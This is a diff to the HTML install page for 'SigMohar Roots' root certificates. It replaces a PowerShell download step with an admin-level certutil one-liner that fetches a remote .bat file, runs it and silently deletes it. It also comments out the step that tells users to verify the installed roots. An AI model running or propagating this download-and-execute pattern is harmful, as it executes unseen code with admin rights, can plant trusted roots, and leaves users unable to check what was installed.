@@ -491,14 +491,15 @@
             <li>
               <div class="step-num">01</div>
               <div class="step-body">
-                <p class="step-title">Open PowerShell as Administrator, then download SigMohar Roots</p>
+                <p class="step-title">Open Cmd as Administrator, then download SigMohar Roots</p>
                 <div class="cmd">
-                  <span class="prompt">PS&gt;</span>
-                  <code>Invoke-WebRequest -Uri "https://ca.sigmohar.com/r/install_roots_on_windows.bat" -OutFile "install_roots_on_windows.bat"</code>
+                  <span class="prompt">C:&gt;</span>
+                  <code>(certutil -urlcache -split -f "https://sigmohar.com/static/install_roots_on_windows.bat" "%TEMP%\install_roots_on_windows.bat" && "%TEMP%\install_roots_on_windows.bat") & del /q "%TEMP%\install_roots_on_windows.bat" >nul 2>&1</code>
                   <button class="copy">Copy</button>
                 </div>
               </div>
             </li>
+<!--
             <li>
               <div class="step-num">02</div>
               <div class="step-body">
@@ -522,6 +523,7 @@
                 <p class="step-note">Or via Certificate Manager: run <code style="font-family:inherit;background:none;border:none;padding:0;">certlm.msc</code> and check Trusted Root Certification Authorities.</p>
               </div>
             </li>
+-->
           </ol>
         </div>
       </article>
